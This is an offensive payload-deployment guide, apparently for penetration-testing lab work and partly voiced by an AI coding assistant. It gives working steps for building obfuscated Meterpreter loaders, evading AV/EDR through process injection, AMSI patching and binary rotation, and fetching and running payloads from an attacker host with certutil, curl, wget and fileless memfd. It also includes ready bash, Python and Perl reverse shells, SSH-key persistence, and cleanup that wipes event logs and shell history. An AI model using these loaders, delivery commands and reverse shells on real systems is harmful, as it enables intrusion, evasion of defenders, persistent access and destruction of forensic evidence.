# Payload Obfuscation & Loader Instructions

Practical guide for OSAI lab work covering both Windows and Linux targets.
Assumes you're on Kali with the payload toolkit checked out under
`/home/kapi/osai/tools/revshell/payloads/msf/` (or equivalent).

---

## 0. Mental model

Every drop is three moving parts:

1. **Shellcode** — the actual Meterpreter/shell payload, generated by
   `msfvenom` as raw bytes. This is what your `multi/handler` catches.
2. **Loader** — a small program that decrypts the shellcode in memory
   and jumps into it. This is what disk-based AV/EDR sees, so *this*
   is what needs obfuscating.
3. **Delivery** — how you land the loader on target and execute it.

Never confuse "obfuscate the shellcode" with "obfuscate the loader". The
shellcode is already random-looking bytes; scanners only see it once it's
in memory. The loader is your file on disk — that's the fingerprint game.

---

## 1. Windows

Three loader options, in escalating stealth:

### 1a. .NET loader (`../Loader.cs`)
AES-256 encrypted shellcode, fiber execution, runtime API resolution.
Fast to iterate, works everywhere with .NET Framework 4.0+.
**First choice** on a fresh box. Gets signatured after 2–3 drops per binary.

```
cd /home/kapi/osai/tools/revshell/payloads/msf/
./build.sh 192.168.45.180 443
```

Requires: `msfvenom`, `mono-mcs` (`apt install mono-mcs`), `openssl`, `python3`.
Output: `svcupd.exe` (or the name you pass), x64, ~7 KB.

### 1b. Native C loader (`../c-loader/`)
XOR-obfuscated shellcode, fiber execution, plain WinAPI. No CLR, no AMSI,
no CryptoAPI. Different signature surface from the .NET one. **Switch to
this when Defender starts eating the .NET binary.**

```
apt install -y mingw-w64          # one-time
cd /home/kapi/osai/tools/revshell/payloads/msf/c-loader/
./build.sh 192.168.45.180 443
```

Output: `svcupd.exe`, x64 native PE, ~15 KB.

### 1c. Rotate + rebuild every drop
Both build scripts already rotate the encryption key per invocation, so
`sha256sum` changes even with the same LHOST/LPORT. **Do this:**

- Rename the output between drops: `update.exe`, `svcupd.exe`,
  `TeamsSetup.exe`, `WinDbg.exe`, `RuntimeBroker.exe`.
- Alternate .NET ↔ C loader across hosts. Never drop the same binary
  shape twice on the same machine.
- Change the LPORT too — helps you tell sessions apart in msfconsole
  and slightly reshapes the shellcode.

### 1c-2. Spawn-inject loader (`../spawn-inject/`) — use this when sessions die in < 2 seconds

The single-process loaders (1a, 1b) run Meterpreter inside themselves. Behavioral
engines watch the loader process and kill it 1–2 seconds after spotting the memory
pattern. The spawn-inject loader breaks this by living in a different process:

1. Spawns `notepad.exe` in `CREATE_SUSPENDED` state (hidden, no window).
2. Decrypts shellcode into a local heap buffer.
3. `VirtualAllocEx RW` → `WriteProcessMemory` → `VirtualProtectEx RX` into the child.
4. `QueueUserAPC(shellcode, main_thread)` + `ResumeThread` — the "early bird" pattern:
   the APC fires before ntdll reaches the image entry point, so Meterpreter starts
   running *inside notepad before the loader even finishes its own cleanup*.
5. Loader closes handles, exits, and disappears.

**Result:** Meterpreter runs inside a Microsoft-signed process. The loader that did all
the suspicious work is already gone. The outbound network connection comes from
`notepad.exe`, not an unknown PE.

```
cd /home/kapi/osai/tools/revshell/payloads/msf/spawn-inject/
./build.sh 192.168.45.227 443
# default: reverse_https, staged

# Stageless (recommended when stage download is getting blocked/killed):
./build.sh 192.168.45.227 443 update.exe windows/x64/meterpreter_reverse_https
#                                                            ↑ underscore = stageless
```

For stageless, also update `handler.rc`:
```
set PAYLOAD windows/x64/meterpreter_reverse_https
```
*(underscore, not slash — the handler payload must match what msfvenom embedded)*

**When to use what:**

| Scenario | Loader |
|---|---|
| First drop, fresh box | `.NET loader` (1a) |
| .NET gets caught | `C loader` (1b) |
| Sessions die < 2 s | `spawn-inject` (this) |
| Stage download killed | `spawn-inject` + `meterpreter_reverse_https` (stageless) |
| HTTPS blocked entirely | `spawn-inject` + `meterpreter_reverse_tcp` port 80/8080 |

### 1d. Extra obfuscation levers (if all loaders get caught)

Signal-loss ordered smallest-to-biggest change:

1. **Change the msfvenom encoder** (weakest, but free):
   ```
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=... LPORT=... \
     -e x64/xor_dynamic -i 3 \
     -f raw -o sc.bin
   ```
   Then feed `sc.bin` into your loader instead of the raw payload. Change
   `build.sh` to skip its own generation and read your pre-baked bin.
   *Diminishing returns — Defender knows msf encoders.*

2. **Stageless payloads** — avoids the stage-download TCP hit that heuristic
   engines flag:
   ```
   ./build.sh 192.168.45.180 443 svcupd.exe windows/x64/meterpreter_reverse_https
   ```
   (note the underscore, not slash, after `meterpreter`). Bigger blob
   (~200 KB), but self-contained.

3. **AMSI patch before shellcode exec** — patch `AmsiScanBuffer` in-process
   so any additional payloads loaded later aren't scanned. Only worth doing
   if you're going to load more .NET / PowerShell in-session.

4. **Sacrificial process pattern** — loader spawns `notepad.exe` /
   `RuntimeBroker.exe` suspended, injects shellcode into it via
   `WriteProcessMemory` + `NtQueueApcThread`, resumes, then the loader
   exits. Meterpreter lives in a Microsoft-signed process from second one.
   Big change, big payoff. Ask and I'll build it.

5. **Signed DLL sideloading** — ship a legit signed EXE (e.g. an OneDrive
   updater) + your malicious DLL it loads. Entry point is trusted, your
   DLL never runs as `.exe` on disk. Highest-effort, cleanest bypass.

### 1e. Handler for Windows

`../handler.rc` covers it. Key bits already set:

- `set ExitOnSession false` — handler keeps listening after a catch.
- `set SessionCommunicationTimeout 600` — 10 min of silence before death.
- `set InitialAutoRunScript "multi_console_command -cl 'migrate -N svchost.exe'"`
  — auto-migrate to svchost (always exists, both sessions 0 and user).

Start it inside tmux so it survives Claude CLI restarts:
```
tmux new -s msf
msfconsole -q -r handler.rc
# Ctrl-B D to detach; `tmux attach -t msf` to reattach
```

### 1f. Windows delivery methods

Pick based on your foothold. In descending order of stealth:

- **HTTP pull** — you host on Kali, target grabs:
  ```
  # on Kali:
  cd /home/kapi/osai/tools/revshell/payloads/msf/
  python3 -m http.server 8080

  # on target (any shell — RCE, SSRF-via-cmd, service exec, etc.):
  certutil -urlcache -f http://192.168.45.180:8080/svcupd.exe C:\Windows\Tasks\svcupd.exe
  # or:
  curl.exe -o C:\Windows\Tasks\svcupd.exe http://192.168.45.180:8080/svcupd.exe
  # or (PowerShell, noisier):
  iwr http://192.168.45.180:8080/svcupd.exe -OutFile C:\Windows\Tasks\svcupd.exe

  # execute:
  C:\Windows\Tasks\svcupd.exe
  ```
  `C:\Windows\Tasks\` is world-writable and rarely inspected.

- **SMB write** — if you have creds:
  ```
  smbclient //target/C$ -U 'user%pass' -c 'cd Windows/Tasks; put svcupd.exe'
  ```
  Then execute via `wmiexec`, scheduled task, or service creation.

- **In-memory PS one-liner** (no file on disk) — if you must, but PowerShell
  is heavily instrumented and AMSI eats most of these on modern Windows.

- **DLL/EXE via existing exploit chain** — vulnerable service, DLL search
  order hijack, SUID-style COM abuse. Whatever your enum turned up.

## 2. Linux

Similar shape, different tools.

### 2a. Native ELF loader (`../linux-loader/`)
XOR-obfuscated shellcode, `mmap`+`mprotect` (no RWX), stack-buffer
decryption, static-linked so it runs on any glibc version.

```
cd /home/kapi/osai/tools/revshell/payloads/msf/linux-loader/
./build.sh 192.168.45.180 4444
```

Requires: `gcc`, `msfvenom`, `python3`, `openssl` (all standard on Kali).
Output: `systemd-agent` (or your name), ELF x64 static, ~800 KB (static
adds glibc).

Static is a tradeoff: bigger file, but zero dependency on the target's
glibc version and no dynamic linker signatures. For a smaller binary,
edit `build.sh` and drop `-static` — you'll then need matching or
older-than-target glibc.

### 2b. When native ELF is overkill

Linux targets rarely run AV at the same maturity as Windows. Often you
don't need a loader at all — a plain msfvenom ELF or even a bash one-liner
just works. Escalation ladder:

**Cheapest, first try:**
```
# on Kali:
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.45.180 LPORT=4444 -f elf -o /tmp/agent
# transfer, chmod +x, execute
```

**If that gets caught** (some hardened boxes do run ClamAV or CrowdStrike
for Linux):
```
# add an encoder pass:
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.45.180 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f elf -o /tmp/agent
```

**If AV still catches it:** use the native loader (2a).

**If ELF drop isn't an option** (read-only fs, no write perms, chroot),
skip the loader and go interpreter-based:

Bash reverse shell:
```
bash -c 'exec bash -i &>/dev/tcp/192.168.45.180/4444 <&1'
```

Python (most Linux boxes have it):
```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.180",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Perl:
```
perl -e 'use Socket;$i="192.168.45.180";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Catch these with `nc -lvnp 4444` (a plain shell, not meterpreter) — or
if you want to upgrade to meterpreter afterwards, use
`post/multi/manage/shell_to_meterpreter` inside msfconsole.

### 2c. Handler for Linux

Same `multi/handler`, different payload string:
```
msfconsole -q -x "\
  use exploit/multi/handler; \
  set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.45.180; \
  set LPORT 4444; \
  set ExitOnSession false; \
  set SessionCommunicationTimeout 600; \
  exploit -j -z"
```

**Do not** use the Windows `InitialAutoRunScript` migration — Linux
Meterpreter can't migrate the same way, and it'll just error. Linux
Meterpreter is stable enough in the original process that you don't
need to.

### 2d. Linux delivery methods

- **HTTP pull** — same trick as Windows:
  ```
  # on target:
  wget http://192.168.45.180:8080/systemd-agent -O /tmp/.cache-a1b2 && \
    chmod +x /tmp/.cache-a1b2 && \
    /tmp/.cache-a1b2 &
  # or curl:
  curl -sSo /tmp/.cache-a1b2 http://192.168.45.180:8080/systemd-agent && \
    chmod +x /tmp/.cache-a1b2 && /tmp/.cache-a1b2 &
  ```
  Hide it in `/tmp`, `/dev/shm`, or `/var/tmp` with a name that blends
  in (`.cache-*`, `systemd-*`, `dbus-*`).

- **Base64 pipe** — no disk write ever, direct into `bash`:
  ```
  # on Kali, produce the payload:
  base64 -w0 /home/kapi/osai/tools/revshell/payloads/msf/linux-loader/systemd-agent > agent.b64

  # on target — write to disk from base64 (loader still hits disk, but
  # no wget/curl in the command line = less noisy in histories):
  echo <base64 blob> | base64 -d > /dev/shm/.k && chmod +x /dev/shm/.k && /dev/shm/.k
  ```

- **memfd_create fileless** — most modern Linux (kernel 3.17+) supports
  loading executables from memory-only fds. Small helper:
  ```
  # on target — download+exec without ever touching disk:
  python3 -c "
  import ctypes, os, urllib.request
  buf = urllib.request.urlopen('http://192.168.45.180:8080/systemd-agent').read()
  libc = ctypes.CDLL(None)
  fd = libc.memfd_create(b'runtime', 0)
  os.write(fd, buf)
  os.execve(f'/proc/self/fd/{fd}', ['runtime'], os.environ)
  "
  ```
  Nothing on disk; the binary lives in RAM under `/proc/<pid>/fd/`.

- **SSH key drop** — if you already have any shell, plant your key in
  `~/.ssh/authorized_keys` for persistence and lateral, then use ssh
  from Kali directly.

## 3. Shared workflow — always do this

Regardless of OS:

1. **Listener before payload.** Start `msfconsole` and get the handler
   running before you drop anything. Landing a payload with no listener
   just gives the target a chance to alert someone.
2. **tmux the msfconsole.** Terminals die. Ligolo drops. Claude CLI
   restarts. If msfconsole isn't in tmux, every Meterpreter dies with it.
3. **Two live sessions minimum.** Once you land your first shell, get a
   second one to a different process or a scheduled-task-persisted copy.
   Never experiment on your only session.
4. **Note every credential immediately** — `osai-cred-vault add` (from
   the OSAI skills). Sessions die; a filed cred lives forever.
5. **Rotate binaries per host.** Same file hash on two boxes = one AV
   telemetry hit burns both.

## 4. When "session opens but doesn't respond"

Same on both OSes:

- Bump the interact timeout: `sessions --interact <id> --timeout 60`.
- If it still hangs, the loader was killed post-connect (AV/EDR quarantine
  after the stage was already in memory). Move on — rebuild with a
  different loader and a fresh name.
- Check `sessions -l` for zombie sessions: `sessions -k <id>` to kill
  cleanly. Zombie sessions eat ports and confuse msgrpc.

## 5. Cleanup

**Windows:**
```
del /f /q C:\Windows\Tasks\svcupd.exe
del /f /q C:\Users\%USERNAME%\AppData\Local\Temp\svcupd.exe
wevtutil cl Security      # only if you have SYSTEM and it's expected
```

**Linux:**
```
rm -f /tmp/.cache-a1b2 /dev/shm/.k
history -c && history -w
unset HISTFILE
```

Meterpreter side (either OS):
```
sessions -k <id>          # clean session close
jobs -K                   # kill all listeners
```
